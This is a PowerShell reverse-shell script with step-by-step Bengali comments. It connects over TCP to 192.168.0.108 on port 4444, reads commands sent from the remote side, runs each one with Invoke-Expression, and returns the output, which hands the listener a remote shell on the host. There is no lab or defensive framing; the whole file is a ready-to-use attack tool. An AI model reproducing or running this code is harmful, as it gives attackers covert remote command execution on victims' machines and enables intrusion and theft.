# সার্ভারের IP ঠিকানা এবং পোর্ট নম্বর
$ipAddress = "192.168.0.108"
$port = 4444

# ভেরিয়েবলের নামগুলো আরও বর্ণনামূলক করা হয়েছে
$remoteConnection = New-Object System.Net.Sockets.TCPClient($ipAddress, $port)
$streamObject = $remoteConnection.GetStream()

# ডেটা গ্রহণ করার জন্য একটি বাইট অ্যারে বাফার তৈরি করা হচ্ছে
[byte[]]$dataBuffer = 0..65535 | ForEach-Object { 0 }

# অবিরাম ডেটা গ্রহণ এবং কমান্ড এক্সিকিউট করার জন্য লুপ
# যতক্ষণ পর্যন্ত সার্ভার ডেটা পাঠাবে, এই লুপটি চলতে থাকবে
while (($receivedBytes = $streamObject.Read($dataBuffer, 0, $dataBuffer.Length)) -ne 0) {
    
    # সার্ভার থেকে gelen বাইটগুলোকে একটি স্ট্রিং-এ (কমান্ড) রূপান্তর করা হচ্ছে
    $incomingCommand = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($dataBuffer, 0, $receivedBytes)
    
    # প্রাপ্ত কমান্ডটিকে এক্সিকিউট করা হচ্ছে
    # 2>&1 এর মাধ্যমে সাধারণ আউটপুট এবং এরর উভয়ই ধরা হচ্ছে
    $executionResult = (Invoke-Expression $incomingCommand 2>&1 | Out-String)
    
    # কমান্ডের ফলাফলকে আবার বাইট অ্যারে-তে রূপান্তর করা হচ্ছে
    $byteOutput = ([Text.Encoding]::ASCII).GetBytes($executionResult)
    
    # ফলাফলটি সার্ভারে ফেরত পাঠানো হচ্ছে
    $streamObject.Write($byteOutput, 0, $byteOutput.Length)
    
    # স্ট্রিম বাফার খালি করা হচ্ছে যাতে সব ডেটা পাঠানো নিশ্চিত হয়
    $streamObject.Flush()
}

# লুপ শেষ হলে (অর্থাৎ সংযোগ বিচ্ছিন্ন হলে) সংযোগটি বন্ধ করা হচ্ছে
$remoteConnection.Close()
